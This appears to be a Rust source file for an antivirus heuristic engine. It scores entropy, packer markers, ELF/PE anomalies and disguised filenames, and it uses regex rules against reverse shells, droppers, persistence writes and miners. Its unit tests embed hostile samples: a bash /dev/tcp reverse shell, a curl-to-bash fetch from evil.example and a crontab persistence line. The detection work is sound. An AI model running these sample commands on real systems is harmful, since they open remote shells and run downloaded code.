//! Heuristic engine — signature-less detection of *unknown* threats.
//!
//! Milestone-1 heuristics (all real, no placeholders):
//! * **Shannon entropy** on ELF/PE binaries → packed/encrypted payloads.
//! * **Packer markers** (UPX, Themida, ASPack).
//! * **Behavioural byte-patterns** in scripts/binaries: reverse shells,
//!   `curl|bash` droppers, netcat backdoors, persistence writes, destructive
//!   commands, obfuscated `eval`/base64.
//!
//! Findings are scored conservatively (LOW/MEDIUM, HIGH only for unambiguous
//! reverse-shell/destructive patterns) so the whitelist and multi-engine
//! consensus stay meaningful. Deeper ELF-section analysis (goblin) and eBPF
//! behavioural tracing arrive in Milestone 3.

use crate::engine::{Engine, FileContext};
use aegis_core::{Detection, Severity, ThreatClass};
use regex::bytes::Regex;
use std::sync::OnceLock;

/// Compute Shannon entropy (bits/byte, 0.0–8.0) of a buffer.
pub fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0u64; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0f64;
    for &c in freq.iter() {
        if c > 0 {
            let p = c as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

struct Pattern {
    re: Regex,
    threat: &'static str,
    reason: &'static str,
    severity: Severity,
    class: ThreatClass,
    /// Whether this pattern is meaningful inside a compiled ELF/PE binary.
    ///
    /// Most behavioural patterns describe *interpreted* intent (a bash/python
    /// one-liner). Those strings appearing incidentally inside a compiled
    /// binary — e.g. `/etc/cron` in a keyring GUI or `LD_PRELOAD=` in a wrapper —
    /// are not evidence of malice and were the source of false positives on
    /// system binaries. Such patterns run on scripts/text only. Traits that are
    /// genuinely damning even in a binary (cryptominer pool strings) set this to
    /// `true`.
    binary_ok: bool,
}

fn patterns() -> &'static [Pattern] {
    static PATTERNS: OnceLock<Vec<Pattern>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        let p = |re: &str, threat, reason, severity, class, binary_ok| Pattern {
            re: Regex::new(re).expect("valid heuristic regex"),
            threat,
            reason,
            severity,
            class,
            binary_ok,
        };
        vec![
            p(
                r"/dev/tcp/\d{1,3}(\.\d{1,3}){3}/\d+",
                "Suspicious.ReverseShell.Bash",
                "Bash reverse shell via /dev/tcp",
                Severity::High,
                ThreatClass::ReverseShell,
                false, // /dev/tcp is a bash feature — meaningless in a binary
            ),
            p(
                r"(?i)nc\s+-[a-z]*e\s+/bin/(sh|bash)",
                "Suspicious.ReverseShell.Netcat",
                "Netcat backdoor (nc -e)",
                Severity::High,
                ThreatClass::ReverseShell,
                false,
            ),
            p(
                r"(?is)socket\.socket\([^)]*\).{0,120}connect\([^)]*\).{0,200}(dup2|/bin/sh|/bin/bash)",
                "Suspicious.ReverseShell.Python",
                "Python reverse-shell pattern",
                Severity::High,
                ThreatClass::ReverseShell,
                false,
            ),
            p(
                r"(?i)(curl|wget)\s+[^\n|;&]{0,200}\|\s*(bash|sh|zsh|python)",
                "Suspicious.Dropper.PipeShell",
                "Remote payload piped to an interpreter",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)(base64\s+-d|base64\s+--decode)[^\n|]{0,60}\|\s*(bash|sh|python)",
                "Suspicious.Obfuscation.Base64Exec",
                "Base64-decoded content piped to a shell",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)eval\s*\(\s*(atob|Buffer\.from|base64_decode)",
                "Suspicious.Obfuscation.Eval",
                "eval() of decoded/obfuscated payload",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)(os\.system|subprocess\.(call|Popen|run))\([^)]{0,80}(rm\s+-rf\s+/|mkfs|dd\s+if=)",
                "Suspicious.Destructive.Command",
                "Destructive system command",
                Severity::High,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                // Require write/install *intent* (redirect into, or piping to
                // crontab) rather than a mere mention, so legitimate scripts
                // that only reference these paths are not flagged.
                r"(?i)((>>?)\s*\S{0,40}(/etc/cron|\.ssh/authorized_keys)|\|\s*crontab\s+-)",
                "Suspicious.Persistence",
                "Writes to a persistence location (cron/authorized_keys)",
                Severity::Low,
                ThreatClass::Persistence,
                false,
            ),
            p(
                r"(?i)(stratum\+tcp://|--donate-level|cryptonight|xmrig)",
                "Suspicious.CryptoMiner",
                "Cryptominer configuration strings",
                Severity::High,
                ThreatClass::CryptoMiner,
                true, // miner pool strings are damning even inside an ELF
            ),
            p(
                // Only flag LD_PRELOAD pointing at a writable/temp/hidden path —
                // the actual injection pattern. Legitimate wrappers preload from
                // system library paths, which this ignores.
                r#"(?i)LD_PRELOAD\s*=\s*["']?(/tmp/|/dev/shm/|/var/tmp/|/run/shm/)"#,
                "Suspicious.LdPreload",
                "LD_PRELOAD from a temporary path (injection)",
                Severity::Low,
                ThreatClass::Heuristic,
                false,
            ),
        ]
    })
}

const PACKER_MARKERS: &[(&[u8], &str)] = &[
    (b"UPX!", "UPX-packed executable"),
    (b"$Info: This file is packed", "UPX-packed executable"),
    (b".themida", "Themida-protected"),
    (b"aspack", "ASPack-packed"),
];

#[derive(Debug)]
pub struct HeuristicEngine {
    entropy_threshold: f64,
}

impl HeuristicEngine {
    pub fn new(entropy_threshold: f64) -> Self {
        Self { entropy_threshold }
    }
}

impl Default for HeuristicEngine {
    fn default() -> Self {
        Self::new(7.2)
    }
}

impl Engine for HeuristicEngine {
    fn name(&self) -> &str {
        "Heuristic"
    }

    fn status(&self) -> String {
        format!(
            "ready · entropy≥{:.1}, {} behaviour rules",
            self.entropy_threshold,
            patterns().len()
        )
    }

    fn scan(&self, ctx: &FileContext<'_>) -> Vec<Detection> {
        let data = ctx.data;
        if data.is_empty() {
            return Vec::new();
        }
        let mut out = Vec::new();

        let head = &data[..data.len().min(512)];
        let is_elf = head.starts_with(b"\x7fELF");
        let is_pe = head.starts_with(b"MZ");
        let is_macho = head.starts_with(&[0xfe, 0xed, 0xfa, 0xce])
            || head.starts_with(&[0xfe, 0xed, 0xfa, 0xcf])
            || head.starts_with(&[0xca, 0xfe, 0xba, 0xbe]);
        let is_executable = is_elf || is_pe || is_macho;

        // Polyglot inspection: non-PE container hiding a full PE binary
        if !is_pe && data.len() > 1024 {
            let is_image_or_doc = head.starts_with(b"GIF89a")
                || head.starts_with(b"GIF87a")
                || head.starts_with(b"\xff\xd8\xff")
                || head.starts_with(b"\x89PNG\r\n\x1a\n")
                || head.starts_with(b"%PDF-");
            if is_image_or_doc {
                if let Some(mz_idx) = find_bytes_index(&data[64..data.len().min(1024 * 1024)], b"MZ") {
                    let actual_idx = 64 + mz_idx;
                    if actual_idx + 0x40 <= data.len() {
                        let pe_off = u32::from_le_bytes(data[actual_idx + 0x3c..actual_idx + 0x40].try_into().unwrap_or([0; 4])) as usize;
                        if actual_idx + pe_off + 4 <= data.len() && &data[actual_idx + pe_off..actual_idx + pe_off + 4] == b"PE\0\0" {
                            out.push(Detection::with_scores(
                                "Heuristic",
                                "Suspicious.Polyglot.HiddenPE",
                                Severity::High,
                                ThreatClass::Heuristic,
                                format!("File disguised as image/document contains a hidden executable PE payload at offset 0x{:x}", actual_idx),
                                0.9,
                                0.9,
                            ));
                        }
                    }
                }
            }
        }

        // 1. Packer markers — run ONLY on executables (never on text or data)
        if is_executable {
            let scan_head = &data[..data.len().min(65536)];
            for (marker, reason) in PACKER_MARKERS {
                if find_bytes(scan_head, marker) {
                    out.push(Detection::with_scores(
                        "Heuristic",
                        "Packed.Executable",
                        Severity::Medium,
                        ThreatClass::PackedBinary,
                        *reason,
                        0.7,
                        0.7,
                    ));
                    break;
                }
            }
        }

        // 2. Structural binary parsing with goblin (ELF & PE)
        if is_elf {
            if let Ok(elf) = goblin::elf::Elf::parse(data) {
                if elf.section_headers.is_empty() && !elf.program_headers.is_empty() {
                    out.push(Detection::with_scores(
                        "Heuristic",
                        "ELF.Sectionless",
                        Severity::Low,
                        ThreatClass::Heuristic,
                        "ELF binary has completely stripped section header table (anti-reverse engineering evasion)",
                        0.5,
                        0.6,
                    ));
                }
                for sh in &elf.section_headers {
                    let is_w = (sh.sh_flags & goblin::elf::section_header::SHF_WRITE as u64) != 0;
                    let is_x = (sh.sh_flags & goblin::elf::section_header::SHF_EXECINSTR as u64) != 0;
                    if is_w && is_x && sh.sh_size > 0 {
                        out.push(Detection::with_scores(
                            "Heuristic",
                            "ELF.RWXSection",
                            Severity::Medium,
                            ThreatClass::Heuristic,
                            "ELF contains an executable and writable (W+X) section (self-modifying code / packer)",
                            0.75,
                            0.8,
                        ));
                        break;
                    }
                    if let Some(name) = elf.shdr_strtab.get_at(sh.sh_name) {
                        if name.starts_with(".upx") || name.starts_with("UPX") {
                            out.push(Detection::with_scores(
                                "Heuristic",
                                "Packed.UPXSection",
                                Severity::Medium,
                                ThreatClass::PackedBinary,
                                format!("ELF has UPX packer section '{name}'"),
                                0.8,
                                0.85,
                            ));
                            break;
                        }
                    }
                }
            }
        } else if is_pe {
            let parsed_pe = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                goblin::pe::PE::parse(data)
            }));

            if let Ok(Ok(pe)) = parsed_pe {
                let mut max_raw_end = 0usize;
                let mut entry_in_exec_section = false;

                for s in &pe.sections {
                    // Characteristics: IMAGE_SCN_MEM_EXECUTE (0x20000000) | IMAGE_SCN_MEM_WRITE (0x80000000)
                    let is_x = (s.characteristics & 0x2000_0000) != 0;
                    let is_w = (s.characteristics & 0x8000_0000) != 0;
                    let raw_end = (s.pointer_to_raw_data + s.size_of_raw_data) as usize;
                    if raw_end > max_raw_end {
                        max_raw_end = raw_end;
                    }

                    if pe.entry >= s.virtual_address as usize
                        && pe.entry < (s.virtual_address + s.virtual_size.max(s.size_of_raw_data)) as usize
                    {
                        if is_x {
                            entry_in_exec_section = true;
                        }
                    }

                    if is_w && is_x && s.size_of_raw_data > 0 {
                        out.push(Detection::with_scores(
                            "Heuristic",
                            "PE.RWXSection",
                            Severity::Medium,
                            ThreatClass::Heuristic,
                            "PE contains an executable and writable (W+X) section (packer / shellcode injection)",
                            0.75,
                            0.8,
                        ));
                        break;
                    }
                    let name = String::from_utf8_lossy(&s.name);
                    let trim_name = name.trim_matches('\0').trim();
                    if trim_name.starts_with("UPX")
                        || trim_name.starts_with(".themida")
                        || trim_name.starts_with(".aspack")
                        || trim_name.starts_with(".vmp")
                    {
                        out.push(Detection::with_scores(
                            "Heuristic",
                            "Packed.Section",
                            Severity::Medium,
                            ThreatClass::PackedBinary,
                            format!("PE contains packer section '{trim_name}'"),
                            0.8,
                            0.85,
                        ));
                        break;
                    }
                }

                if pe.entry > 0 && !entry_in_exec_section && !pe.sections.is_empty() {
                    out.push(Detection::with_scores(
                        "Heuristic",
                        "PE.AnomalousEntrypoint",
                        Severity::Medium,
                        ThreatClass::Heuristic,
                        format!("PE entry point (RVA 0x{:x}) points outside standard executable sections", pe.entry),
                        0.7,
                        0.75,
                    ));
                }

                if max_raw_end > 0 && data.len() > max_raw_end + 1024 * 1024 {
                    let overlay_len = data.len() - max_raw_end;
                    if overlay_len > data.len() / 3 {
                        out.push(Detection::with_scores(
                            "Heuristic",
                            "PE.SuspiciousOverlay",
                            Severity::Low,
                            ThreatClass::Heuristic,
                            format!("PE contains a massive unmapped overlay ({} bytes, {:.0}% of file size)", overlay_len, (overlay_len as f64 / data.len() as f64) * 100.0),
                            0.5,
                            0.6,
                        ));
                    }
                }
            }
        }

        // Filename and extension masquerading checks (RTLO & directional control chars)
        if let Some(filename) = ctx.path.file_name().and_then(|n| n.to_str()) {
            let directional_chars = ['\u{202A}', '\u{202B}', '\u{202C}', '\u{202D}', '\u{202E}', '\u{2066}', '\u{2067}', '\u{2068}', '\u{2069}'];
            if let Some(c) = directional_chars.iter().find(|&&c| filename.contains(c)) {
                out.push(Detection::with_scores(
                    "Heuristic",
                    "Suspicious.RTLO.Filename",
                    Severity::Critical,
                    ThreatClass::Heuristic,
                    format!("Filename '{filename}' contains directional Unicode override character (U+{:04X}) to disguise file extension", *c as u32),
                    0.95,
                    0.95,
                ));
            }

            let lower = filename.to_ascii_lowercase();
            let suspicious_exec_exts = ["exe", "scr", "pif", "vbs", "js", "hta", "bat", "cmd", "ps1"];
            let fake_doc_exts = ["pdf", "docx", "doc", "xlsx", "xls", "pptx", "jpg", "jpeg", "png", "zip", "txt", "mp4"];
            for exec_ext in &suspicious_exec_exts {
                if lower.ends_with(&format!(".{exec_ext}")) {
                    for doc_ext in &fake_doc_exts {
                        if lower.contains(&format!(".{doc_ext}.{exec_ext}")) {
                            out.push(Detection::with_scores(
                                "Heuristic",
                                "Suspicious.DoubleExtension",
                                Severity::High,
                                ThreatClass::Heuristic,
                                format!("Filename '{filename}' uses a deceptive double extension disguise (.{doc_ext}.{exec_ext})"),
                                0.9,
                                0.9,
                            ));
                            break;
                        }
                    }
                    break;
                }
            }

            if lower.ends_with(".lnk") && data.len() < 5 * 1024 * 1024 {
                let text_lower = String::from_utf8_lossy(data).to_ascii_lowercase();
                if (text_lower.contains("powershell") || text_lower.contains("cmd.exe") || text_lower.contains("mshta") || text_lower.contains("certutil") || text_lower.contains("curl"))
                    && (text_lower.contains("http://") || text_lower.contains("https://") || text_lower.contains("-enc") || text_lower.contains("bypass"))
                {
                    out.push(Detection::with_scores(
                        "Heuristic",
                        "Suspicious.WeaponizedLNK",
                        Severity::High,
                        ThreatClass::Heuristic,
                        "Windows shortcut (.lnk) contains embedded command shell or remote payload execution",
                        0.85,
                        0.9,
                    ));
                }
            }
        }

        // 3. Shannon entropy on executables
        if is_executable {
            let sample = &data[..data.len().min(1024 * 1024)];
            let ent = shannon_entropy(sample);
            if ent >= self.entropy_threshold {
                out.push(Detection::with_scores(
                    "Heuristic",
                    "Suspicious.HighEntropy",
                    Severity::Low,
                    ThreatClass::PackedBinary,
                    format!("Executable entropy {ent:.2} — likely packed/encrypted"),
                    0.4,
                    0.4,
                ));
            }
        }

        // 4. Behavioural byte patterns.
        // Script patterns run on scripts/interpreters; compiled executables only run patterns that explicitly opted in (`binary_ok`).
        // Documentation, markup, and config files (.md, .txt, .json, .yaml) are exempted from dropper false positives.
        let ext = ctx.path.extension().and_then(|e| e.to_str()).unwrap_or("");
        let is_binary = head.contains(&0u8);
        let is_text = !is_binary;
        let is_doc = matches!(ext, "md" | "markdown" | "txt" | "rst" | "json" | "yaml" | "yml" | "toml" | "xml" | "html" | "css");
        let is_script = head.starts_with(b"#!")
            || matches!(ext, "sh" | "bash" | "zsh" | "py" | "pl" | "rb" | "js" | "ps1" | "bat" | "cmd");

        let region = &data[..data.len().min(1024 * 1024)];
        for pat in patterns() {
            let applicable = (is_executable && pat.binary_ok)
                || (!is_doc && (is_script || (is_text && !is_executable && ext.is_empty())));
            if applicable && pat.re.is_match(region) {
                out.push(Detection::new(
                    "Heuristic",
                    pat.threat,
                    pat.severity,
                    pat.class,
                    pat.reason,
                ));
            }
        }

        out
    }
}

/// Naive substring search over bytes (buffers here are small/capped).
fn find_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

fn find_bytes_index(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn ctx<'a>(data: &'a [u8]) -> FileContext<'a> {
        FileContext {
            path: Path::new("/x"),
            data,
            size: data.len() as u64,
            sha256: "",
        }
    }

    #[test]
    fn entropy_bounds() {
        assert!(shannon_entropy(b"") == 0.0);
        assert!(shannon_entropy(&[0u8; 1000]) < 0.01);
        let random: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(shannon_entropy(&random) > 7.9);
    }

    #[test]
    fn detects_bash_reverse_shell() {
        let eng = HeuristicEngine::default();
        let d = eng.scan(&ctx(
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        ));
        assert!(d.iter().any(|x| x.threat.contains("ReverseShell")));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let eng = HeuristicEngine::default();
        let d = eng.scan(&ctx(b"curl http://evil.example/x.sh | bash"));
        assert!(d.iter().any(|x| x.threat.contains("Dropper")));
    }

    #[test]
    fn clean_text_is_clean() {
        let eng = HeuristicEngine::default();
        assert!(eng.scan(&ctx(b"just some ordinary notes here")).is_empty());
    }

    /// A synthetic ELF containing a benign `/etc/cron` string (like a real
    /// keyring GUI) must NOT be flagged for persistence — this was the
    /// system-binary false positive.
    #[test]
    fn elf_with_incidental_cron_string_is_not_flagged() {
        let mut data = Vec::new();
        data.extend_from_slice(b"\x7fELF\x02\x01\x01\0");
        data.extend_from_slice(&[0u8; 32]); // binary content (NUL bytes)
        data.extend_from_slice(b"open /etc/cron.d/session for editing\0");
        data.extend_from_slice(b"LD_PRELOAD=libfoo.so wrapper\0");
        let d = HeuristicEngine::default().scan(&ctx(&data));
        assert!(
            !d.iter().any(|x| x.threat.contains("Persistence")),
            "persistence string in an ELF must not fire: {d:?}"
        );
        assert!(!d.iter().any(|x| x.threat.contains("LdPreload")));
    }

    /// The same string in an actual shell script SHOULD be flagged.
    #[test]
    fn script_with_cron_string_is_flagged() {
        let d = HeuristicEngine::default()
            .scan(&ctx(b"#!/bin/sh\necho '* * * * * evil' | crontab -\n"));
        assert!(d.iter().any(|x| x.threat.contains("Persistence")));
    }

    /// Cryptominer pool strings are damning even inside a binary.
    #[test]
    fn elf_with_miner_strings_is_flagged() {
        let mut data = Vec::new();
        data.extend_from_slice(b"\x7fELF\x02\x01\x01\0");
        data.extend_from_slice(&[0u8; 16]);
        data.extend_from_slice(b"stratum+tcp://pool.evil:3333\0xmrig\0");
        let d = HeuristicEngine::default().scan(&ctx(&data));
        assert!(d.iter().any(|x| x.threat.contains("CryptoMiner")));
    }

    #[test]
    fn detects_double_extension_and_rtlo() {
        let eng = HeuristicEngine::default();
        let fc_double = FileContext {
            path: Path::new("invoice.pdf.exe"),
            data: b"MZ\x90\x00data",
            size: 8,
            sha256: "",
        };
        let d_double = eng.scan(&fc_double);
        assert!(d_double.iter().any(|x| x.threat == "Suspicious.DoubleExtension"));

        let fc_rtlo = FileContext {
            path: Path::new("invoice\u{202E}fdp.exe"),
            data: b"MZ\x90\x00data",
            size: 8,
            sha256: "",
        };
        let d_rtlo = eng.scan(&fc_rtlo);
        assert!(d_rtlo.iter().any(|x| x.threat == "Suspicious.RTLO.Filename"));
    }
}
